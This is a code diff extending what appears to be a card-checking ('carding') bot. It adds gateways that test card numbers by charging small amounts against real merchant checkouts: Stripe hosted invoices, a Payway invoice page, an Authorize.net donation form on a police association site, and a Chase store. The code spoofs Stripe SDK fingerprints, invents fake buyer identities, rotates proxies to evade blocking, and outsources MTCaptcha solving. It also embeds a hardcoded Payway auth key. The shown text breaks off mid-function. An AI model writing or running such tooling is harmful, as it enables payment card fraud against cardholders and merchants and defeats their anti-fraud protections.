@@ -404,6 +404,16 @@ MASS_CHECK_GATEWAY_TASK_DICT_NAMES = {
     "msk": "stripe_sk_active_tasks",
     "msq": "sq_active_tasks",
     "msy": "cc_active_tasks",
+
+    "mpway": "ext_active_tasks",
+
+    "manet": "ext_active_tasks",
+
+    "chase": "ext_active_tasks",
+
+    "mchk": "ext_active_tasks",
+
+    "msa": "ext_active_tasks",
 }
 
 # Premium custom-emoji IDs used as button icons (icon_custom_emoji_id) on the
@@ -12848,6 +12858,14 @@ class GatewayManager:
             "united_way": {"enabled": True, "name": "United Way", "emoji": "💳"},
             "square_1usd": {"enabled": True, "name": "Square 1$", "emoji": "🟦"},
             "coustom_charged": {"enabled": True, "name": "COUSTOM CHARGED", "emoji": "🔥"},
+
+            "pway": {"enabled": True, "name": "Payway 1$", "emoji": "💳"},
+
+            "anet": {"enabled": True, "name": "Authorize.net 1$", "emoji": "💳"},
+
+            "chase": {"enabled": True, "name": "Chase 0.75$", "emoji": "💳"},
+
+            "sauth": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔐"},
             
             # Razorpay
             "razorpay": {"enabled": True, "name": "Razorpay", "emoji": "💰"},
@@ -13020,7 +13038,7 @@ class GatewayManager:
             "sc": "stripe_charge_v2", "msc": "stripe_charge_v2",
             "sta": "stripe_auth", "stamc": "stripe_auth",
             "stamcheck": "stripe_auth",
-            "chk": "auto_stripe", "mchk": "auto_stripe",
+            "chk": "sauth", "mchk": "sauth",
             "mcheck": "auto_stripe",
             "rz": "razorpay", "mrz": "razorpay", "rzmc": "razorpay",
             "rz1": "razorpay2", "mrz1": "razorpay2",
@@ -13037,6 +13055,14 @@ class GatewayManager:
             "sk": "stripe_sk", "msk": "stripe_sk",
             "sq": "square_1usd", "msq": "square_1usd",
             "sy": "coustom_charged", "msy": "coustom_charged",
+
+            "pway": "pway", "mpway": "pway",
+
+            "anet": "anet", "manet": "anet",
+
+            "ch": "chase", "chase": "chase",
+
+            "sa": "sauth", "msa": "sauth",
             "bt": "bt_kaffn8", "mbt": "bt_kaffn8",
             "stco": "stco",
             "whop": "whop", "jhit": "jhit",
@@ -18435,7 +18461,7 @@ def load_stripe_proxies_stco() -> dict:
 
 # ============ CHECKOUT SESSION FUNCTIONS ============
 
-async def get_checkout_info_stco(url: str) -> dict:
+async def get_checkout_info_stco(url: str, proxy: str = None) -> dict:
     """Get Stripe checkout information WITHOUT consuming the session."""
     result = {
         "url": url,
@@ -18456,6 +18482,12 @@ async def get_checkout_info_stco(url: str) -> dict:
     }
     
     try:
+        if stco_is_invoice_url(url):
+            inv = await stco_invoice_context(url, proxy)
+            result.update(inv)
+            result["time"] = 0
+            return result
+
         decoded = decode_stripe_url_stco(url)
         result["pk"] = decoded.get("pk")
         result["cs"] = decoded.get("cs")
@@ -18690,6 +18722,2860 @@ def _stco_init_totals(init_data, session_data=None):
     return checksum, total, subtotal
 
 
+# ══════════════════════════════════════════════════════════════════════
+#  STRIPE HOSTED INVOICE  (invoice.stripe.com/i/…)
+#
+#  Same idea as Checkout but a different API:
+#    1. resolve invoice_id (in_…) + pk_live_… from the hosted page
+#    2. GET  /v1/invoices/{in}/hosted      -> payment_intent + client_secret
+#    3. POST /v1/payment_intents/{pi}/confirm  (publishable key flow)
+#    4. read status / last_payment_error
+#  No ephemeral key or confirmation token needed for step 3.
+# ══════════════════════════════════════════════════════════════════════
+
+STCO_STRIPE_VERSION = "2020-03-02"
+STCO_INVOICE_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                   "AppleWebKit/537.36 (KHTML, like Gecko) "
+                   "Chrome/131.0.0.0 Safari/537.36")
+
+
+def stco_is_invoice_url(url: str) -> bool:
+    return "invoice.stripe.com" in (url or "").lower()
+
+
+def _stco_html_first(html: str, pattern: str):
+    m = re.search(pattern, html or "")
+    return m.group(1) if m else None
+
+
+async def stco_invoice_context(url: str, proxy: str = None) -> dict:
+    """Resolve a hosted invoice link -> invoice id + pk + ephemeral key.
+
+    The page is a JS shell, so the data comes from Stripe's invoice backend:
+        GET https://invoicedata.stripe.com/hosted_invoice_page/{acct}/{token}
+    which returns invoice_id, publishable_key and ephemeral_key. The invoice
+    itself (payment_intent + client_secret) is then read with that key.
+    """
+    ctx = {"mode": "invoice", "url": url, "in": None, "pk": None, "ek": None,
+           "acct": None, "pi": None, "client_secret": None, "customer": None,
+           "merchant": "Stripe Invoice", "price": None, "currency": None,
+           "success_url": None, "cancel_url": None, "error": None,
+           "is_valid": False, "time": 0}
+
+    m = re.search(r"/i/(acct_[A-Za-z0-9]+)/([^/?#]+)", url or "")
+    if not m:
+        ctx["error"] = "Could not parse invoice URL (expected /i/acct_x/token)"
+        return ctx
+    acct, token = m.group(1), m.group(2)
+
+    try:
+        client = await stco_tls.get_client(proxy)
+
+        r = await client.get(
+            f"https://invoicedata.stripe.com/hosted_invoice_page/{acct}/{token}",
+            headers={"accept": "application/json",
+                     "user-agent": STCO_INVOICE_UA,
+                     "referer": "https://invoice.stripe.com/"})
+        print(f"🧾 [INVOICE] resource HTTP {getattr(r, 'status_code', '?')}")
+        if getattr(r, "status_code", 0) != 200:
+            ctx["error"] = f"Invoice lookup failed (HTTP {getattr(r, 'status_code', '?')})"
+            return ctx
+
+        d = r.json()
+        ctx["in"] = d.get("invoice_id")
+        ctx["pk"] = d.get("publishable_key")
+        ctx["ek"] = d.get("ephemeral_key")
+        ctx["acct"] = d.get("payment_merchant_id") or acct
+        _mer = d.get("merchant") or {}
+        if isinstance(_mer, dict) and _mer.get("name"):
+            ctx["merchant"] = _mer["name"]
+
+        if not (ctx["in"] and ctx["pk"] and ctx["ek"]):
+            ctx["error"] = "Invoice resource missing id / keys"
+            return ctx
+
+        hr = await client.get(
+            f"https://api.stripe.com/v1/invoices/{ctx['in']}/hosted"
+            f"?expand%5B0%5D=payment_intent.payment_method",
+            headers={"authorization": f"Bearer {ctx['ek']}",
+                     "stripe-version": STCO_STRIPE_VERSION,
+                     "accept": "application/json"})
+        if getattr(hr, "status_code", 0) == 200:
+            inv = hr.json()
+            pi = inv.get("payment_intent")
+            if isinstance(pi, dict):
+                ctx["pi"] = pi.get("id")
+                ctx["client_secret"] = pi.get("client_secret")
+            elif isinstance(pi, str):
+                ctx["pi"] = pi
+            try:
+                ctx["price"] = round((inv.get("amount_due") or 0) / 100.0, 2)
+            except Exception:
+                pass
+            ctx["currency"] = (inv.get("currency") or "").upper() or None
+            _c = inv.get("customer")
+            ctx["customer"] = _c if isinstance(_c, str) else (_c or {}).get("id")
+            print(f"🧾 [INVOICE] {ctx['in']} · {ctx['price']} {ctx['currency']} · pi={ctx['pi']}")
+        else:
+            print(f"⚠️ [INVOICE] hosted GET {getattr(hr, 'status_code', '?')}")
+
+        ctx["is_valid"] = bool(ctx["in"] and ctx["pk"] and ctx["ek"]
+                               and ctx["pi"] and ctx["client_secret"])
+        if not ctx["is_valid"]:
+            ctx["error"] = "Invoice has no payment_intent / client_secret"
+    except Exception as e:
+        ctx["error"] = str(e)[:160]
+        ctx["is_valid"] = False
+
+    return ctx
+
+
+async def _stco_invoice_ctoken(client, card: Dict, ctx: dict):
+    """Create a confirmation_token the way the Stripe SDK does.
+
+    Stripe rejects publishable-key tokenisation unless the request carries the
+    SDK's identity fields ("required to use the Stripe SDK"), so the body
+    mirrors the browser: payment_user_agent, attribution metadata,
+    guid/muid/sid and the client_context block.
+    """
+    js_ver = "f15915056d"
+    sess_id = str(uuid.uuid4())
+    data = {
+        "key":                                   ctx["pk"],
+        # NB: version is sent ONLY via the stripe-version header — sending
+        # _stripe_version too is rejected ("…but not both").
+        "payment_method_data[type]":             "card",
+        "payment_method_data[card][number]":     card["cc"],
+        "payment_method_data[card][exp_month]":  card["month"],
+        "payment_method_data[card][exp_year]":   card["year"],
+        "payment_method_data[card][cvc]":        card["cvv"],
+        "payment_method_data[allow_redisplay]":  "limited",
+        "payment_method_data[billing_details][address][country]": "US",
+        "payment_method_data[billing_details][address][postal_code]": "10013",
+        "payment_method_data[pasted_fields]":    "number",
+        "payment_method_data[payment_user_agent]": (
+            f"stripe.js/{js_ver}; stripe-js-v3/{js_ver}; "
+            "payment-element; deferred-intent; hip"),
+        "payment_method_data[referrer]":         "https://invoice.stripe.com",
+        "payment_method_data[time_on_page]":     str(random.randint(15000, 90000)),
+        "payment_method_data[guid]":             f"{uuid.uuid4().hex}{uuid.uuid4().hex[:8]}",
+        "payment_method_data[muid]":             f"{uuid.uuid4().hex}{uuid.uuid4().hex[:8]}",
+        "payment_method_data[sid]":              f"{uuid.uuid4().hex}{uuid.uuid4().hex[:8]}",
+        "payment_method_data[client_attribution_metadata][client_session_id]": sess_id,
+        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "checkout",
+        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
+        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
+        "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
+        "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
+        "payment_method_data[client_attribution_metadata][elements_session_id]":
+            f"elements_session_{uuid.uuid4().hex[:8]}",
+        "payment_method_data[client_attribution_metadata][elements_session_config_id]": str(uuid.uuid4()),
+        "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "currencySelector",
+        "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][1]": "expressCheckout",
+        "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][2]": "payment",
+        "client_attribution_metadata[client_session_id]": sess_id,
+        "client_context[currency]": (ctx.get("currency") or "USD").lower(),
+        "client_context[mode]": "payment",
+        "client_context[allowed_payment_method_types][0]": "card",
+        "client_context[allowed_payment_method_types][1]": "link",
+        "set_as_default_payment_method": "false",
+        "setup_future_usage":                    "off_session",
+    }
+    if ctx.get("customer"):
+        data["client_context[customer]"] = ctx["customer"]
+    if ctx.get("acct"):
+        data["_stripe_account"] = ctx["acct"]
+
+    r = await client.post(
+        "https://api.stripe.com/v1/confirmation_tokens",
+        data=data,
+        headers={"accept": "application/json",
+                 "content-type": "application/x-www-form-urlencoded",
+                 "origin": "https://js.stripe.com",
+                 "referer": "https://js.stripe.com/",
+                 "stripe-version": STCO_STRIPE_VERSION})
+    try:
+        body = r.json()
+        if body.get("id"):
+            print(f"✅ [INVOICE] ctoken {body['id']}")
+            return body["id"]
+        print(f"⚠️ [INVOICE] ctoken {r.status_code}: {json.dumps(body)[:220]}")
+    except Exception:
+        pass
+    return None
+
+
+async def stco_invoice_charge(card: Dict, ctx: dict, proxy: str = None,
+                              bypass_3ds: bool = True, result: Dict = None) -> Dict:
+    """Charge the invoice: confirmation_token -> hosted/confirm_payment."""
+    result = result or {"card": "", "status": None, "response": None,
+                        "time": 0, "attempts": []}
+    start = time.perf_counter()
+    attempt = {"attempt": 1, "status": "started", "error": None}
+
+    try:
+        client = await stco_tls.get_client(proxy)
+
+        ctoken = await _stco_invoice_ctoken(client, card, ctx)
+        if not ctoken:
+            result["status"] = "ERROR"
+            result["response"] = "Could not tokenise card"
+            result["time"] = round(time.perf_counter() - start, 2)
+            result["attempts"].append(attempt)
+            return result
+
+        r = await client.post(
+            f"https://api.stripe.com/v1/invoices/{ctx['in']}/hosted/confirm_payment",
+            data={"confirmation_token": ctoken, "payment_intent": ctx["pi"]},
+            headers={"accept": "application/json",
+                     "authorization": f"Bearer {ctx['ek']}",
+                     "content-type": "application/x-www-form-urlencoded",
+                     "origin": "https://invoice.stripe.com",
+                     "referer": "https://invoice.stripe.com/",
+                     "stripe-version": STCO_STRIPE_VERSION})
+        print(f"📥 [INVOICE] confirm_payment HTTP {r.status_code}")
+        try:
+            conf = r.json()
+        except Exception:
+            conf = {}
+
+        # Authoritative verdict comes from the payment intent itself.
+        pi_status, pi_err = "", {}
+        try:
+            pr = await client.get(
+                f"https://api.stripe.com/v1/payment_intents/{ctx['pi']}",
+                params={"client_secret": ctx["client_secret"],
+                        "key": ctx["pk"],
+                        "_stripe_account": ctx.get("acct") or "",
+                        "_stripe_version": STCO_STRIPE_VERSION},
+                headers={"accept": "application/json",
+                         "origin": "https://js.stripe.com",
+                         "referer": "https://js.stripe.com/"})
+            if getattr(pr, "status_code", 0) == 200:
+                pj = pr.json()
+                pi_status = str(pj.get("status") or "")
+                pi_err = pj.get("last_payment_error") or {}
+        except Exception as pe:
+            print(f"⚠️ [INVOICE] pi fetch failed: {pe}")
+
+        err = pi_err or (conf.get("error") if isinstance(conf, dict) else {}) or {}
+
+        if pi_status == "succeeded":
+            result["status"] = "CHARGED"
+            result["response"] = "Payment Successful"
+        elif pi_status == "processing":
+            result["status"] = "CHARGED"
+            result["response"] = "Payment Processing"
+        elif pi_status == "requires_action":
+            if bypass_3ds:
+                result["status"] = "DECLINED"
+                result["response"] = "GENERIC_DECLINE"
+            else:
+                result["status"] = "3DS"
+                result["response"] = "3DS Required"
+        else:
+            code = str(err.get("decline_code") or err.get("code") or "")
+            msg = str(err.get("message") or "")
+            low = f"{code} {msg}".lower()
+            if "insufficient" in low or "not sufficient" in low:
+                result["status"] = "INSUFFICIENT_FUNDS"
+                result["response"] = "INSUFFICIENT_FUNDS"
+            elif code:
+                result["status"] = "DECLINED"
+                result["response"] = code.upper()
+            elif pi_status in ("requires_payment_method", ""):
+                result["status"] = "DECLINED"
+                result["response"] = "GENERIC_DECLINE"
+            else:
+                result["status"] = "DECLINED"
+                result["response"] = "GENERIC_DECLINE"
+            print(f"❌ [INVOICE] status={pi_status} code={code} {msg}"[:170])
+
+        attempt["status"] = "completed"
+        result["attempts"].append(attempt)
+    except Exception as e:
+        result["status"] = "ERROR"
+        result["response"] = f"Request failed: {str(e)[:90]}"
+        attempt["error"] = str(e)
+        result["attempts"].append(attempt)
+
+    result["time"] = round(time.perf_counter() - start, 2)
+    return result
+
+
+# ══════════════════════════════════════════════════════════════════════
+#  EXTERNAL GATEWAYS  —  ported from the wiz bundle
+#
+#  Each gateway is a small async checker against a real merchant checkout.
+#  Single/mass UI, credits, hit saving and the Live/Dead/Charged keyboard are
+#  shared, so adding a gateway = one checker function + one registry line.
+# ══════════════════════════════════════════════════════════════════════
+
+EXT_PRICE_LABEL = "$1.00"
+ext_active_tasks = {}
+_EXT_SEEN = set()
+
+EXT_GATEWAYS = {
+    "pway": {"label": "Payway 1$",        "cmd": "pway", "mcmd": "mpway",   "price": "$1.00"},
+    "anet": {"label": "Authorize.net 1$", "cmd": "anet", "mcmd": "manet",   "price": "$1.00"},
+    "chase": {"label": "Chase 0.75$",     "cmd": "ch",    "price": "$0.75", "mass": False},
+    "sauth": {"label": "Stripe Auth 0$",  "cmd": "chk",   "price": "$0.00", "mass": True, "mcmd": "mchk"},
+}
+EXT_BY_CMD = {g["cmd"]: k for k, g in EXT_GATEWAYS.items()}
+EXT_BY_CMD.setdefault("chase", "chase")          # legacy alias for /ch
+EXT_BY_CMD.setdefault("sa", "sauth")             # alias for /chk
+EXT_BY_MCMD_ALIASES = {"msa": "mchk"}
+EXT_BY_MCMD = {g["mcmd"]: k for k, g in EXT_GATEWAYS.items() if g.get("mcmd")}
+
+EXT_UA_ANDROID = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+                  "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")
+
+
+def _ext_card_parts(card):
+    p = [x.strip() for x in str(card or "").split("|")]
+    if len(p) < 4:
+        return None
+    cc = re.sub(r"\D", "", p[0])
+    mm = re.sub(r"\D", "", p[1]).zfill(2)
+    yy = re.sub(r"\D", "", p[2])[-2:]
+    cvv = re.sub(r"\D", "", p[3])
+    if len(cc) < 13 or not mm or not yy or len(cvv) < 3:
+        return None
+    return cc, mm, yy, cvv
+
+
+def _ext_norm_proxy(raw):
+    """Normalise host:port:user:pass *and* http://host:port:user:pass forms."""
+    if not raw:
+        return None
+    s = str(raw).strip()
+    if "://" in s:
+        scheme, rest = s.split("://", 1)
+        if "@" not in rest and rest.count(":") >= 3:
+            parts = rest.split(":")
+            host, port, user = parts[0], parts[1], parts[2]
+            pwd = ":".join(parts[3:])
+            if port.isdigit():
+                return f"{scheme}://{user}:{pwd}@{host}:{port}"
+        return s
+    return format_proxy(s)
+
+
+_EXT_GOOD_PROXY = {}    # user_id -> last proxy that actually worked
+_EXT_DEAD_PROXY = {}    # proxy_url -> monotonic time it failed
+_EXT_DEAD_TTL = 1800    # 30 min: never retried during this window
+
+
+def _ext_mark_dead(url: str):
+    """Blacklist a proxy that just failed (CONNECT tunnel / 407 / timeout)."""
+    if not url:
+        return
+    _EXT_DEAD_PROXY[url] = time.monotonic()
+    try:
+        shown = mask_proxy_stco(url)
+    except Exception:
+        shown = "proxy"
+    print(f"🚫 [EXT] dead proxy blacklisted 30m: {shown}")
+
+    # Also drop it from the global pool for good, so no other flow retries it.
+    try:
+        for raw in list(global_proxy_pool.proxies):
+            if _ext_norm_proxy(raw) == url:
+                global_proxy_pool.proxies.remove(raw)
+                try:
+                    global_proxy_pool.save_proxies()
+                except Exception:
+                    pass
+                print("🗑 [EXT] removed from global proxy pool")
+                break
+    except Exception:
+        pass
+
+
+def _ext_is_dead(url: str) -> bool:
+    ts = _EXT_DEAD_PROXY.get(url)
+    if ts is None:
+        return False
+    if time.monotonic() - ts < _EXT_DEAD_TTL:
+        return True
+    _EXT_DEAD_PROXY.pop(url, None)
+    return False
+
+
+def _ext_proxy_list(user_id=None, limit: int = 3):
+    """External gateways use ONLY the global pool; empty list => direct.
+
+    User/admin proxy lists are intentionally ignored here: a single dead
+    dispenser entry there used to poison every /ch, /pway, /anet run.
+    """
+    try:
+        if not global_proxy_pool.enabled:
+            return []
+        pool = list(global_proxy_pool.proxies or [])
+    except Exception:
+        pool = []
+    random.shuffle(pool)
+    out = []
+    for raw in pool:
+        try:
+            url = _ext_norm_proxy(raw)
+        except Exception:
+            url = None
+        if url and "@" in url and url.count(":") >= 2 and url not in out:
+            if _ext_is_dead(url):
+                continue
+            out.append(url)
+        if len(out) >= limit:
+            break
+    # Prefer the proxy that worked last time so a dead one is not retried first
+    good = _EXT_GOOD_PROXY.get(user_id)
+    if good and good in out:
+        out.remove(good)
+        out.insert(0, good)
+    return out
+
+
+def _ext_proxy(user_id):
+    """Backwards-compatible single proxy (mass uses this)."""
+    lst = _ext_proxy_list(user_id, 1)
+    return lst[0] if lst else None
+
+
+def _ext_proxy_dead(res: dict) -> bool:
+    t = str(res.get("response") or "").lower()
+    markers = ("proxy", "curl: (5)", "curl: (7)", "curl: (56)", "connect tunnel",
+               "failed to perform", "407", "timed out", "readerror", "connecterror",
+               "remotedisconnected", "connection reset")
+    return any(m in t for m in markers)
+
+
+async def ext_run_check(key: str, card: str, proxy=None, user_id=None) -> dict:
+    """Try every configured proxy, then fall back to a direct connection.
+
+    A dead/blocked proxy (oxylabs dispenser, 407, timeout, curl 5/7) is
+    skipped instead of failing the whole check.
+    """
+    fn = EXT_CHECKERS[key]
+    cands = proxy if isinstance(proxy, list) else ([proxy] if proxy else [])
+
+    for i, p in enumerate(cands[:3]):
+        try:
+            res = await fn(card, p)
+        except Exception as e:
+            res = {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+        if not _ext_proxy_dead(res):
+            if user_id:
+                _EXT_GOOD_PROXY[user_id] = p
+            if i:
+                print(f"✅ [EXT] proxy #{i + 1} worked")
+            return res
+        _ext_mark_dead(p)
+        print(f"⚠️ [EXT] proxy #{i + 1} failed — removed for this session")
+
+    try:
+        res = await fn(card, None)
+    except Exception as e:
+        res = {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+    return res
+
+
+# ── Payway 1$ (coriowm.com.au) ───────────────────────────────────────
+async def _ext_payway_check(card: str, proxy: str = None) -> dict:
+    d = _ext_card_parts(card)
+    if not d:
+        return {"status": "ERROR", "response": "Bad card format"}
+    cc, mm, yy, cvv = d
+    try:
+        c = await stco_tls.get_client(proxy)
+        r = await c.get("https://www.coriowm.com.au/pay-an-invoice/",
+                        headers={"user-agent": EXT_UA_ANDROID, "accept": "text/html"})
+        m = (re.search(r'admin-ajax\.php","nonce":"([^"]+)"', r.text or "")
+             or re.search(r'nonce":"([^"]+)"', r.text or ""))
+        if not m:
+            return {"status": "ERROR", "response": "Nonce not found"}
+        nonce = m.group(1)
+
+        tok = await c.post(
+            "https://api.payway.com.au/rest/v1/single-use-tokens",
+            data={"paymentMethod": "creditCard", "connectionType": "FRAME",
+                  "cardNumber": cc, "cvn": cvv,
+                  "cardholderName": f"{random.choice(['John','Michael','David','James','Robert'])} "
+                                    f"{random.choice(['Smith','Johnson','Williams','Brown','Jones'])}",
+                  "expiryDateMonth": mm, "expiryDateYear": yy,
+                  "threeDS2": "false"},
+            headers={"accept": "application/json",
+                     "authorization": "Basic UTE4Mzc1X1BVQl8yc3VxNmt4M3pha2JtdTR6dWQ0eDVhM2ZyZG14eXpxOGlpbnoydjZ4emN5cGs1MnR6YWFzN2dwbWp6ZWk6",
+                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "user-agent": EXT_UA_ANDROID})
+        try:
+            tj = tok.json()
+        except Exception:
+            tj = {}
+        if "singleUseTokenId" not in tj:
+            # Payway puts the real reason in errors/message — show it.
+            _err = str(tj.get("errors") or tj.get("message") or tj.get("error") or "").strip()
+            _err = re.sub(r"\s+", " ", _err)[:90] or "DECLINED"
+            return {"status": "DECLINED", "response": _err}
+
+        pr = await c.post(
+            "https://www.coriowm.com.au/wp-admin/admin-ajax.php",
+            data={"action": "payway_process_payment", "nonce": nonce,
+                  "amount": "1.00", "description": "", "customer_number": "3",
+                  "order_number": "31", "card_token": tj["singleUseTokenId"]},
+            headers={"accept": "*/*",
+                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "origin": "https://www.coriowm.com.au",
+                     "referer": "https://www.coriowm.com.au/pay-an-invoice/",
+                     "user-agent": EXT_UA_ANDROID,
+                     "x-requested-with": "XMLHttpRequest"})
+        body = pr.text or ""
+        if "Payment processing failed" in body:
+            return {"status": "DECLINED", "response": "DECLINED"}
+        return {"status": "CHARGED", "response": "Payment Successful"}
+    except Exception as e:
+        return {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+
+
+# ── Authorize.net 1$ (southamptontownpolicesoa.com donation form) ────
+async def _ext_anet_check(card: str, proxy: str = None) -> dict:
+    d = _ext_card_parts(card)
+    if not d:
+        return {"status": "ERROR", "response": "Bad card format"}
+    cc, mm, yy, cvv = d
+    first = random.choice(["James", "Mary", "Robert", "Linda", "Michael", "Sarah"])
+    last = random.choice(["Smith", "Johnson", "Brown", "Davis", "Miller", "Wilson"])
+    try:
+        c = await stco_tls.get_client(proxy)
+        r = await c.get("https://www.southamptontownpolicesoa.com/donate/",
+                        headers={"user-agent": EXT_UA_ANDROID,
+                                 "accept": "text/html,application/xhtml+xml"})
+        html = r.text or ""
+        m = re.search(r'name=["\']soa_checkout_nonce["\'][^>]*value=["\']([^"\']+)["\']', html)
+        if not m:
+            m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']soa_checkout_nonce["\']', html)
+        if not m:
+            return {"status": "ERROR", "response": "Checkout nonce not found"}
+        soa = m.group(1)
+        am = re.search(r'(?:ajax_)?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
+        ajax_nonce = am.group(1) if am else ""
+
+        form = {
+            "soa_checkout_nonce": soa, "_wp_http_referer": "/donate/",
+            "donation_amount": "1.00",
+            "first_name": first, "last_name": last,
+            "email": f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com",
+            "phone": "".join(random.choices("0123456789", k=10)),
+            "address": f"{random.randint(100,9999)} Main St",
+            "city": random.choice(["Springfield", "Shelbyville", "Riverside"]),
+            "state": random.choice(["CA", "NY", "TX", "FL", "OH"]),
+            "zip": str(random.randint(10000, 99999)),
+            "payment_method": "credit_card",
+            "card_number": cc, "exp_month": mm, "exp_year": yy, "cvv": cvv,
+            "account_holder_name": "", "routing_number": "", "account_number": "",
+            "account_type": "", "bank_name": "",
+            "action": "soa_process_checkout", "nonce": ajax_nonce,
+        }
+        for i in range(1, 9):
+            form[f"products[{i}][quantity]"] = "0"
+
+        pr = await c.post(
+            "https://www.southamptontownpolicesoa.com/wp-admin/admin-ajax.php",
+            data=form,
+            headers={"user-agent": EXT_UA_ANDROID,
+                     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                     "x-requested-with": "XMLHttpRequest",
+                     "origin": "https://www.southamptontownpolicesoa.com",
+                     "referer": "https://www.southamptontownpolicesoa.com/donate/"})
+        body = pr.text or ""
+        if "COMPLETED" in body.upper() or '"success":true' in body.lower():
+            return {"status": "CHARGED", "response": "Payment Successful"}
+        cm = re.search(r"\(Code:\s*([^\)\s]+)\)", body)
+        code = cm.group(1) if cm else "DECLINED"
+        msg = re.sub(r"\s*\(Code:[^\)]+\)", "", body)
+        msg = re.sub(r"^.*unsuccessful\.\s*", "", msg).strip()
+        resp = f"{msg} [{code}]" if msg and len(msg) < 90 else code
+        if "insufficient" in body.lower():
+            return {"status": "INSUFFICIENT_FUNDS", "response": "INSUFFICIENT_FUNDS"}
+        return {"status": "DECLINED", "response": resp}
+    except Exception as e:
+        return {"status": "ERROR", "response": f"Request failed: {str(e)[:80]}"}
+
+
+# ── Chase (creSecure auth-only) — leacockcolemancenter.com store ─────
+# Reference flow: add item → checkout details → creSecure cc_collection
+# → MTCaptcha solve (CapMonster) → Chase Paymentech auth-only submit.
+CHASE_STORE = "https://www.leacockcolemancenter.com"
+CHASE_ITEM_URL = f"{CHASE_STORE}/Bear-Bell---Blue/item/0757"
+CHASE_CRESECURE_INIT = "https://cresecure.net/securepayments/a1/cc_collection.php"
+CHASE_CRESECURE_STORE = "https://leacockcolemancenter.cresecure.net"
+CHASE_CRESECURE_ID = os.environ.get("CHASE_CRESECURE_ID", "vf863730249879")
+CHASE_TOTAL = os.environ.get("CHASE_AMOUNT", "10.05")
+CHASE_ORDER_ID = os.environ.get("CHASE_ORDER_ID", "         W16615")
+CHASE_UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
+            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 "
+            "Mobile/15E148 Safari/604.1")
+# Patterns the reference gate treats as a live card (CVV/AVS/NSF/limit).
+_CHASE_LIVE_HINTS = (
+    "status code 2001", "insufficient", "insufficient funds",
+    "avs_and_cvv", "gateway rejected", "card issuer declined cvv",
+    "declined cvv", "cvv2 mismatch", "incorrect cvv", "stolen card",
+    "nsf", "2001", "2010",
+)
+
+
+def _chase_brand(number: str) -> str:
+    d = re.sub(r"\D", "", number or "")
+    if not d:
+        return "Visa"
+    if d[0] == "4":
+        return "Visa"
+    if d[0] == "5":
+        return "MasterCard"
+    if d[0] == "6":
+        return "Discover"
+    return "UNKNOWN"
+
+
+_CHASE_SOLVERS = (
+    ("capmonster", ("CAPMONSTER_API_KEY", "CAP_MONSTER_KEY")),
+    ("capsolver", ("CAPSOLVER_API_KEY", "CAP_SOLVER_KEY")),
+    ("2captcha", ("TWOCAPTCHA_API_KEY", "TWO_CAPTCHA_API_KEY")),
+)
+
+
+def _chase_solver_keys():
+    """Every configured MTCaptcha solver key, in preference order."""
+    out = []
+    for name, envs in _CHASE_SOLVERS:
+        for env in envs:
+            val = (os.environ.get(env) or "").strip()
+            if val:
+                out.append((name, val))
+                break
+    return out
+
+
+def _chase_solver_poll(provider, base, key, task):
+    """createTask + poll getTaskResult until a token arrives."""
+    try:
+        r = requests.post(base + "/createTask",
+                          json={"clientKey": key, "task": task}, timeout=30)
+        j = r.json()
+        if j.get("errorId"):
+            return None, f"{provider}: {j.get('errorDescription') or j.get('errorCode')}"
+        task_id = j.get("taskId")
+        if not task_id:
+            return None, f"{provider}: no taskId"
+        deadline = time.time() + 130
+        while time.time() < deadline:
+            time.sleep(3)
+            rr = requests.post(base + "/getTaskResult",
+                               json={"clientKey": key, "taskId": task_id},
+                               timeout=30).json()
+            if rr.get("errorId"):
+                return None, f"{provider}: {rr.get('errorDescription') or rr.get('errorCode')}"
+            if str(rr.get("status")).lower() == "ready":
+                sol = rr.get("solution") or {}
+                tok = (sol.get("token") or sol.get("gRecaptchaResponse")
+                       or sol.get("text") or "").strip()
+                return (tok, "") if tok else (None, f"{provider}: empty token")
+        return None, f"{provider}: solve timeout"
+    except Exception as e:
+        return None, f"{provider}: {str(e)[:60]}"
+
+
+def _chase_mtcaptcha(site_url, site_key, action):
+    """Solve MTCaptcha with whichever solver key is configured."""
+    keys = _chase_solver_keys()
+    if not keys:
+        return None, ("Captcha key missing (set CAPMONSTER_API_KEY, "
+                      "CAPSOLVER_API_KEY or TWOCAPTCHA_API_KEY)")
+    errors = []
+    for provider, key in keys:
+        if provider == "capmonster":
+            task = {"type": "MTCaptchaTask", "websiteURL": site_url,
+                    "websiteKey": site_key, "isInvisible": False,
+                    "userAgent": CHASE_UA}
+            if action and action != "%24":
+                task["pageAction"] = action
+            tok, err = _chase_solver_poll(
+                "CapMonster", "https://api.capmonster.cloud", key, task)
+        elif provider == "capsolver":
+            task = {"type": "MtCaptchaTaskProxyLess",
+                    "websiteURL": site_url, "websiteKey": site_key}
+            tok, err = _chase_solver_poll(
+                "CapSolver", "https://api.capsolver.com", key, task)
+        else:
+            task = {"type": "MtCaptchaTaskProxyless",
+                    "websiteURL": site_url, "websiteKey": site_key}
+            tok, err = _chase_solver_poll(
+                "2Captcha", "https://api.2captcha.com", key, task)
+        if tok:
+            return tok, ""
+        errors.append(err or provider)
+    return None, " | ".join(errors)[:140]
+
+
+def _chase_check_sync(card: str, proxy: str = None) -> dict:
+    d = _ext_card_parts(card)
+    if not d:
